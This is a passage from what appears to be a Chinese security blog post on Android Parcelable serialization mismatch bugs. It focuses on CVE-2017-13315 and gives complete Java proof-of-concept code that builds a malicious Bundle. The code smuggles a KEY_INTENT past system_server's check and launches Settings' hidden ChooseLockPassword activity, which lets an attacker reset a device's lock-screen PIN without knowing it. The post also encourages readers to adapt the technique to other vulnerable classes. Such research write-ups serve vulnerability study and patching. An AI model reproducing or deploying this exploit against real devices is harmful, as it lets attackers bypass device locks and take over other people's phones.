        pcelData.writeInt(<span class="number">1</span>);<span class="comment">//dataStatus</span>
        pcelData.writeInt(<span class="number">1</span>);<span class="comment">// flag for data</span>
        pcelData.writeInt(<span class="number">0x144</span>); <span class="comment">//length of KEY_INTENT:evilIntent</span>
        <span class="comment">// Evil object hide in PeriodicAdvertisingReport.mData</span>
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(<span class="number">4</span>);
        pcelData.writeString(<span class="string">"android.content.Intent"</span>);<span class="comment">// name of Class Loader</span>
        pcelData.writeString(Intent.ACTION_RUN); <span class="comment">// Intent Action</span>
        Uri.writeToParcel(pcelData, <span class="keyword">null</span>); <span class="comment">// Uri is null</span>
        pcelData.writeString(<span class="keyword">null</span>); <span class="comment">// mType is null</span>
        pcelData.writeInt(<span class="number">0x10000000</span>); <span class="comment">// Flags</span>
        pcelData.writeString(<span class="keyword">null</span>); <span class="comment">// mPackage is null</span>
        pcelData.writeString(<span class="string">"com.android.settings"</span>);
        pcelData.writeString(<span class="string">"com.android.settings.password.ChooseLockPassword"</span>);
        pcelData.writeInt(<span class="number">0</span>); <span class="comment">//mSourceBounds = null</span>
        pcelData.writeInt(<span class="number">0</span>); <span class="comment">// mCategories = null</span>
        pcelData.writeInt(<span class="number">0</span>); <span class="comment">// mSelector = null</span>
        pcelData.writeInt(<span class="number">0</span>); <span class="comment">// mClipData = null</span>
        pcelData.writeInt(-<span class="number">2</span>); <span class="comment">// mContentUserHint</span>
        pcelData.writeBundle(<span class="keyword">null</span>);
        <span class="comment">///////////////////////////////////////</span>
        pcelData.writeString(<span class="string">"Padding-Key"</span>);
        pcelData.writeInt(<span class="number">0</span>); <span class="comment">// VAL_STRING</span>
        pcelData.writeString(<span class="string">"Padding-Value"</span>); <span class="comment">//       </span>
        <span class="keyword">int</span> length  = pcelData.dataSize();
        Log.d(TAG, <span class="string">"length is "</span> + Integer.toHexString(length));
        bndlData.writeInt(length);
        bndlData.writeInt(<span class="number">0x4c444E42</span>);
        bndlData.appendFrom(pcelData, <span class="number">0</span>, length);
        bndlData.setDataPosition(<span class="number">0</span>);
        evilBundle.readFromParcel(bndlData);
        Log.d(TAG, evilBundle.toString());
        <span class="keyword">return</span> evilBundle;
   }</code></pre>
<h3 id="0x03-案例2：CVE-2017-13315"><a href="#0x03-案例2：CVE-2017-13315" class="headerlink" title="0x03 案例2：CVE-2017-13315"></a>0x03 案例2：CVE-2017-13315</h3><p>五月份修复的CVE-2017-13315出现在DcParamObject类中，对比writeToParcel和readFromParcel函数.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public void writeToParcel(Parcel dest, int flags) &#123;</span><br><span class="line">       dest.writeLong(mSubId);</span><br><span class="line">   &#125;</span><br><span class="line">   private void readFromParcel(Parcel in) &#123;</span><br><span class="line">       mSubId &#x3D; in.readInt();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>int类型的成员变量mSubId写入时为long，读出时为int，似乎Bundle中布置数据更有挑战性。但受前面将恶意KEY_INTENT置于ByteArray中启发，可以采用如下方案。</p>
<p><img src="/2018/07/03/bundle-mismatch/dc.png" alt="Bundle2"></p>
<p>在Autherticator App中构造恶意Bundle，携带三个键值对。第一个键值对携带一个DcParamObject对象；第二个键值对的键的16进制表示为0x06，长度为1，值的类型为13代表ByteArray，然后将恶意KEY_INTENT的内容放在ByteArray中；接下来，再随便放置一个键值对。</p>
<p>那么在<code>system_server</code>发生的第一次反序列化中，生成DcParamObject对象，mSubId通过readInt读入为1。后面两个键值对都不是KEY_INTENT，因此可以通过checkIntent检查。</p>
<p>然后，第二次序列化时<code>system_server</code>通过writeLong将mSubId写入Bundle，多出四个字节为0x0000 0000 0000 0001，后续内容不变。</p>
<p>最后，<code>Settings</code>反序列化读入Bundle，由于读入mSubID仍然为readInt，因此只读到0x0000 0001就认为读DcParamObject完毕。接下来开始读第二个键值对，把多出来的四个字节连同紧接着的1，认为是第二个键值对的键为null，然后6作为类型参数被读入，认为是long，于是后面把13和接下来ByteArray length的8字节作为第二个键值对的值。最终，恶意KEY_INTENT显现出来作为第三个键值对！</p>
<h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">Bundle evilBundle &#x3D; new Bundle();</span><br><span class="line">        Parcel bndlData &#x3D; Parcel.obtain();</span><br><span class="line">        Parcel pcelData &#x3D; Parcel.obtain();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Manipulate the raw data of bundle Parcel</span><br><span class="line">        &#x2F;&#x2F; Now we replace this right Parcel data to evil Parcel data</span><br><span class="line">        pcelData.writeInt(3); &#x2F;&#x2F; number of elements in ArrayMap</span><br><span class="line">        &#x2F;*****************************************&#x2F;</span><br><span class="line">        &#x2F;&#x2F; mismatched object</span><br><span class="line">        pcelData.writeString(&quot;mismatch&quot;);</span><br><span class="line">        pcelData.writeInt(4); &#x2F;&#x2F; VAL_PACELABLE</span><br><span class="line">        pcelData.writeString(&quot;com.android.internal.telephony.DcParamObject&quot;); &#x2F;&#x2F; name of Class Loader</span><br><span class="line">        pcelData.writeInt(1);&#x2F;&#x2F;mSubId</span><br><span class="line"></span><br><span class="line">        pcelData.writeInt(1);</span><br><span class="line">        pcelData.writeInt(6);</span><br><span class="line">        pcelData.writeInt(13);</span><br><span class="line">        &#x2F;&#x2F;pcelData.writeInt(0x144); &#x2F;&#x2F;length of KEY_INTENT:evilIntent</span><br><span class="line">        pcelData.writeInt(-1); &#x2F;&#x2F; dummy, will hold the length</span><br><span class="line">        int keyIntentStartPos &#x3D; pcelData.dataPosition();</span><br><span class="line">        &#x2F;&#x2F; Evil object hide in PeriodicAdvertisingReport.mData</span><br><span class="line">        pcelData.writeString(AccountManager.KEY_INTENT);</span><br><span class="line">        pcelData.writeInt(4);</span><br><span class="line">        pcelData.writeString(&quot;android.content.Intent&quot;);&#x2F;&#x2F; name of Class Loader</span><br><span class="line">        pcelData.writeString(Intent.ACTION_RUN); &#x2F;&#x2F; Intent Action</span><br><span class="line">        Uri.writeToParcel(pcelData, null); &#x2F;&#x2F; Uri is null</span><br><span class="line">        pcelData.writeString(null); &#x2F;&#x2F; mType is null</span><br><span class="line">        pcelData.writeInt(0x10000000); &#x2F;&#x2F; Flags</span><br><span class="line">        pcelData.writeString(null); &#x2F;&#x2F; mPackage is null</span><br><span class="line">        pcelData.writeString(&quot;com.android.settings&quot;);</span><br><span class="line">        pcelData.writeString(&quot;com.android.settings.password.ChooseLockPassword&quot;);</span><br><span class="line">        pcelData.writeInt(0); &#x2F;&#x2F;mSourceBounds &#x3D; null</span><br><span class="line">        pcelData.writeInt(0); &#x2F;&#x2F; mCategories &#x3D; null</span><br><span class="line">        pcelData.writeInt(0); &#x2F;&#x2F; mSelector &#x3D; null</span><br><span class="line">        pcelData.writeInt(0); &#x2F;&#x2F; mClipData &#x3D; null</span><br><span class="line">        pcelData.writeInt(-2); &#x2F;&#x2F; mContentUserHint</span><br><span class="line">        pcelData.writeBundle(null);</span><br><span class="line"></span><br><span class="line">        int keyIntentEndPos &#x3D; pcelData.dataPosition();</span><br><span class="line">        int lengthOfKeyIntent &#x3D; keyIntentEndPos - keyIntentStartPos;</span><br><span class="line">        pcelData.setDataPosition(keyIntentStartPos - 4);  &#x2F;&#x2F; backpatch length of KEY_INTENT</span><br><span class="line">        pcelData.writeInt(lengthOfKeyIntent);</span><br><span class="line">        pcelData.setDataPosition(keyIntentEndPos);</span><br><span class="line">        Log.d(TAG, &quot;Length of KEY_INTENT is &quot; + Integer.toHexString(lengthOfKeyIntent));</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">        pcelData.writeString(&quot;Padding-Key&quot;);</span><br><span class="line">        pcelData.writeInt(0); &#x2F;&#x2F; VAL_STRING</span><br><span class="line">        pcelData.writeString(&quot;Padding-Value&quot;); &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        int length  &#x3D; pcelData.dataSize();</span><br><span class="line">        Log.d(TAG, &quot;length is &quot; + Integer.toHexString(length));</span><br><span class="line">        bndlData.writeInt(length);</span><br><span class="line">        bndlData.writeInt(0x4c444E42);</span><br><span class="line">        bndlData.appendFrom(pcelData, 0, length);</span><br><span class="line">        bndlData.setDataPosition(0);</span><br><span class="line">        evilBundle.readFromParcel(bndlData);</span><br><span class="line">        Log.d(TAG, evilBundle.toString());</span><br><span class="line">       return evilBundle;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>由于Settings似乎取消了自动化的点击新建账户接口，上述POC利用的漏洞触发还需要用户在Settings-&gt;Users&amp;accounts中点击我们加入的Authenticator，点击以后就会调用addAccount方法，最终能够启动settings中的隐藏Activity ChooseLockPassword。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">05-07 06:24:34.337  4646  5693 I ActivityManager: START u0 &#123;act&#x3D;android.intent.action.RUN flg&#x3D;0x10000000 cmp&#x3D;com.android.settings&#x2F;.password.ChooseLockPassword (has extras)&#125; from uid 1000</span><br></pre></td></tr></table></figure>
<p>原先设置锁屏PIN码的测试手机，就会出现重新设置PIN码界面，点一下返回，就会出现以下PIN码设置界面。这样就可以在不需要原PIN码的情况下重设锁屏密码。</p>
<p><img src="/2018/07/03/bundle-mismatch/unlock.png" alt="unlock"></p>
<h3 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h3><p>没想到序列化和反序列化作为极小的编程错误，却可以带来深远的安全影响。这类漏洞可能在接下来的安全公告中还会陆续有披露，毕竟在源码树中搜索序列化和反序列化不匹配的Parcelable类是较为容易的，漏洞的作者应该持续收割了一批。</p>
<p>然而，每个类不匹配的情况有所不同，因此在漏洞利用绕过launchAnywhere补丁时需要重新精确布置Bundle，读者可以用其他有漏洞的Parcelable类来练手。</p>
<p>这类漏洞也是不匹配或者说不一致（Inconsistency)性漏洞的典型。除了序列化和反序列化不一致外，历史上mmap和munmap不一致、同一功能实现在Java和C中的不一致、不同系统对同一标准实现的不一致等等都产生过有趣的漏洞，寻找这种不一致也是漏洞研究的一种方法论。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>[1] <a href="https://www.anquanke.com/post/id/103570" target="_blank" rel="noopener">漏洞预警 | Android系统序列化、反序列化不匹配漏洞</a></p>
<p>[2] <a href="http://retme.net/index.php/2014/08/20/launchAnyWhere.html" target="_blank" rel="noopener">launchAnyWhere: Activity组件权限绕过漏洞解析</a></p>
</div><div class="tags"><a href="/tags/Android/"><i class="fa fa-tag"></i>Android</a></div><div class="post-nav"><a class="pre" href="/2018/07/27/CVE-2017-8890-kernel-escalation1/">利用CVE-2017-8890实现linux内核提权- ret2usr</a><a class="next" href="/2018/04/03/qwb2-silent-writeup/">强网杯silent分析</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81/" style="font-size: 15px;">登陆凭证</a> <a href="/tags/JAVA/" style="font-size: 15px;">JAVA</a> <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" style="font-size: 15px;">内网穿透</a> <a href="/tags/PWN/" style="font-size: 15px;">PWN</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">原创漏洞</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a> <a href="/tags/Window/" style="font-size: 15px;">Window</a> <a href="/tags/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/" style="font-size: 15px;">杀毒软件</a> <a href="/tags/Cknife/" style="font-size: 15px;">Cknife</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">审计工具</a> <a href="/tags/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 15px;">恶意程序</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/IOS/" style="font-size: 15px;">IOS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Collect-login-credentials/">linux后渗透之收集登录凭证</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Intranet-penetration/">内网渗透之内网穿透</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/Subrion-Cms-Code-Audit/">Subrion CMS 代码审计</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/19/Java-Debug/">Java无源码调试之英雄崛起</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-smep-bypass/">CVE-2017-8890实现linux内核提权- SMEP绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-kernel-escalation1/">利用CVE-2017-8890实现linux内核提权- ret2usr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/03/bundle-mismatch/">Bundle风水——Android序列化与反序列化不匹配漏洞详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/qwb2-silent-writeup/">强网杯silent分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/Rootme-uaf-writeup/">Rootme CTF UAF Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/22/android-blueborne2/">Android蓝牙远程命令执行漏洞利用实践 exploit优化</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a><ul></ul><a href="http://cybersec.blog.51cto.com" title="网络空间安全的道与术" target="_blank">网络空间安全的道与术</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>